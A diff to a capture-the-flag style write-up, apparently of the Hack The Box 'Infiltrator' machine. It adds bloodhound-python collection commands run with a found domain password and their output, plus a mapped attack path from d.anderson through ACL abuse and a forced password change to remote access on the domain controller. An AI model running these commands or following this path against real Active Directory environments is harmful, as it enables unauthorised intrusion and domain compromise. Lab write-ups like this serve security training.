@@ -619,11 +619,73 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\l.c
 Received `STATUS_ACCOUNT_RESTRICTION` for users `d.anderson` and `m.harris` → this can mean that the password is valid, but the accounts may not have much access
 
 
-### 3.3. Active Directory discovery: Bloodhound
+## 4. Active Directory discovery: Bloodhound
 
-Let's check what access does the accounts found have on the domain
+Let's figure out if there are any viable lateral movement pathways
 
-#### 3.3.1. Generating TGT
+### 4.1. Generating bloodhound packages
+
+```console
+root@kali:~# bloodhound-python -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
+INFO: Found AD domain: infiltrator.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 14 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc01.infiltrator.htb
+INFO: Done in 00M 02S
+INFO: Compressing output into 20241224124349_bloodhound.zip
+```
+
+### 4.2. Checking pathway to Domain Admins
+
+Nothing useful here
+
+![image](https://github.com/user-attachments/assets/3b31b4f3-a0f0-4eab-a57d-3f8a7d284299)
+
+### 4.3. Checking anyone with DCSync rights
+
+Nothing useful here either
+
+![image](https://github.com/user-attachments/assets/df5a6982-3e19-4087-9149-8e22fba3f502)
+
+### 4.4. Checking Kerberoastable accounts
+
+Still, nothing useful here
+
+![image](https://github.com/user-attachments/assets/b2396caa-5338-4317-bd44-befbc9f13f1e)
+
+### 4.5. Checking access pathways of known users
+
+`l.clark` has zero reachable high value targets
+
+![image](https://github.com/user-attachments/assets/ab71f96b-ff55-4a6e-bde7-4a45ccf1e9b7)
+
+Bingo! `d.anderson` has a pathway to `DC01` with `e.rodriguez` and `m.harris` in the pathway
+
+![image](https://github.com/user-attachments/assets/8c77340b-f1f6-4f8d-8d71-4512529cbe48)
+
+```mermaid
+flowchart TD
+  A(d.anderson) -->|GenericAll| B("marketing digital (OU)")
+  B -->|Contains| C(e.rodriguez)
+  C -->|AddSelf| D("chiefs marketing (Group)")
+  D -->|ForceChangePassword| E("m.harris")
+  E -->|CanPSRemote| F("DC01 (Domain Controller)")
+```
+
+## 5. Lateral movement
+
+### 5.1. Generating TGT
 
 Attempting to get TGT with `d.anderson` account resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:
 
@@ -665,77 +727,4 @@ root@kali:~# impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-i
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in d.anderson.ccache
-```
-
-#### 3.3.2. Generating bloodhound packages
-
-Running `bloodhound-python` works for `l.clark` and `d.anderson`, but doesn't see to work for `m.harris`
-
-```console
-root@kali:~# bloodhound-python -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
-INFO: Found AD domain: infiltrator.htb
-INFO: Getting TGT for user
-INFO: Connecting to LDAP server: dc01.infiltrator.htb
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: dc01.infiltrator.htb
-INFO: Found 14 users
-INFO: Found 58 groups
-INFO: Found 2 gpos
-INFO: Found 2 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: dc01.infiltrator.htb
-INFO: Done in 00M 02S
-INFO: Compressing output into 20241224124342_bloodhound.zip
-```
-
-```console
-root@kali:~# bloodhound-python -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
-INFO: Found AD domain: infiltrator.htb
-INFO: Getting TGT for user
-INFO: Connecting to LDAP server: dc01.infiltrator.htb
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: dc01.infiltrator.htb
-INFO: Found 14 users
-INFO: Found 58 groups
-INFO: Found 2 gpos
-INFO: Found 2 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: dc01.infiltrator.htb
-INFO: Done in 00M 02S
-INFO: Compressing output into 20241224124349_bloodhound.zip
-```
-
-```console
-root@kali:~# bloodhound-python -d infiltrator.htb -u m.harris -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
-INFO: Found AD domain: infiltrator.htb
-INFO: Getting TGT for user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
-INFO: Connecting to LDAP server: dc01.infiltrator.htb
-ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0907FC, comment: AcceptSecurityContext error, data 52f, v4563
-Traceback (most recent call last):
-  File "/usr/bin/bloodhound-python", line 33, in <module>
-    sys.exit(load_entry_point('bloodhound==1.7.2', 'console_scripts', 'bloodhound-python')())
-             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 343, in main
-    bloodhound.run(collect=collect,
-  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 78, in run
-    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
-  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 571, in prefetch_info
-    self.get_objecttype()
-  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 260, in get_objecttype
-    self.ldap_connect()
-  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 71, in ldap_connect
-    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/usr/lib/python3/dist-packages/bloodhound/ad/authentication.py", line 125, in getLDAPConnection
-    raise CollectionException('Could not authenticate to LDAP. Check your credentials and LDAP server requirements.')
-bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
 ```
